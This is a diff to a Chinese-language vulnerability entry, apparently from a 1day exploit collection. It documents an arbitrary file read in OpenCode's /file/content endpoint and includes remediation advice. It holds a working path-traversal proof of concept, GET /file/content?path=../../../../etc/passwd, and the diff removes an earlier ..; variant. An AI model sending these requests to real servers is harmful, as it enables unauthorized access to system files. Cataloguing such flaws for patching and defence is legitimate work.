@@ -1,10 +1,16 @@
 vendor = "OpenCode"
 name = "OpenCode content 接口任意文件读取漏洞"
 type = "任意文件读取"
-path = "/content/..;/etc/passwd"
-detail = """GET /content/..;/etc/passwd HTTP/1.1 Host: target
-通过 ..; 路径遍历绕过读取任意文件"""
-fix = "对路径参数做规范化校验，过滤 ..; 等路径穿越序列；WAF 拦截路径遍历特征；限制接口仅允许内网访问。"
-date = 20260710
+version = "所有版本"
+path = "/file/content?path=../../../../etc/passwd"
+detail = """OpenCode 是一个开源的 AI Agent 编码工具，可通过终端界面、桌面应用程序或 IDE 扩展使用。其 /file/content 接口存在路径遍历漏洞，攻击者可利用 path 参数读取服务器任意文件。
+PoC:
+```
+GET /file/content?path=../../../../etc/passwd HTTP/1.1
+Host: target
+```
+Nuclei: 关注公众号回复 ZH-2026-07-15-001 获取"""
+fix = "对 /file/content 接口的 path 参数做规范化校验，过滤 ../ 等路径穿越序列；使用 realpath() 等函数将路径解析为绝对路径后校验是否在允许的读取范围内；WAF 拦截路径遍历特征；限制该接口仅允许内网或授权用户访问。"
+date = 20260715
 label = "1day"
-verifier = "AdySec"
+verifier = "devildollking"
